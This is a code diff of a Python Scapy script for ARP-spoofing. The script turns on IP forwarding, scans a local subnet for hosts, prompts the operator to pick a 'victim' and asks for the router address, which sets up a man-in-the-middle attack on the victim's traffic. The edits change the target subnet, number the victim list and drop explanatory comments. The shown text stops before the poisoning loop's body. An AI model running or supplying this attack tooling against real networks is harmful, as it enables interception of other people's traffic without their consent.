@@ -6,7 +6,7 @@ import time
 os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
 
 
-result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.5.1.0/24")), timeout=3, verbose=0)[0]
+result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")), timeout=3, verbose=0)[0]
 
 print("Online IPs:")
 ip=[]
@@ -16,9 +16,9 @@ for sent, received in result:
     mac.append(received.hwsrc)
 
 for i in range (len(ip)):
-    print(ip[i], " = ", mac[i])
+    print(i+1, ". ", ip[i], " = ", mac[i])
 
-print("Chose a victim:")
+print("Chose a victim from the list:")
 victim = int(input())-1
 print("Input router ip: ")
 routerip = input()
@@ -30,10 +30,6 @@ print ("Victim ip: ", ip[victim],"    Victim mac: ", mac[victim])
 
 print ("Router ip: ", routerip,"    Router mac: ", routermac)
 
-#hwsrc:mac source
-#hwdst: mac dest
-#psrc:ip source
-#pdst:ip dest
 
 try:
     while True:
